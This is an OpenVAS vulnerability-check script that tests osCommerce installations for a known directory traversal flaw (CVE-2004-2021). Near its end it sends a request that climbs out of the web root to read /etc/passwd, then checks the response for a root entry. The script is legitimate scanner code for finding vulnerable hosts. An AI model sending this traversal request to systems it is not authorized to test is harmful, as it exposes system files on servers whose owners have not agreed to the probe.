# OpenVAS Vulnerability Test
# $Id: osCommerce_dirtraversal.nasl 6703 2017-07-12 13:57:25Z cfischer $
# Description: osCommerce directory traversal
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2005 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote host is running osCommerce, a widely installed open source 
shopping e-commerce solution.

The remote version of this software is vulnerable to a directory traversal 
flaw which may be exploited by an attacker to read arbitrary files
on the remote server with the privileges of the web server.";

tag_solution = "Upgrade to a newer version of this software";

# Ref:  Rene <l0om@excluded.org> and Megasky <magasky@hotmail.com>

if (description)
{
 script_id(17595);
 script_version("$Revision: 6703 $");
 script_tag(name:"last_modification", value:"$Date: 2017-07-12 15:57:25 +0200 (Wed, 12 Jul 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-2004-2021");
 script_bugtraq_id(10364);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_name("osCommerce directory traversal");

 script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2005 David Maciejak");
 script_dependencies("oscommerce_detect.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("Software/osCommerce");

 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

CPE = 'cpe:/a:oscommerce:oscommerce';

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

url = string(dir, "/admin/file_manager.php?action=read&filename=../../../../../../../../etc/passwd");
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
if( buf == NULL ) exit(0);

if (egrep(pattern:"root:0:[01]:.*", string:buf))
{
 report = report_vuln_url( port:port, url:url );
 security_message(port:port, data:report);
 exit(0);
}
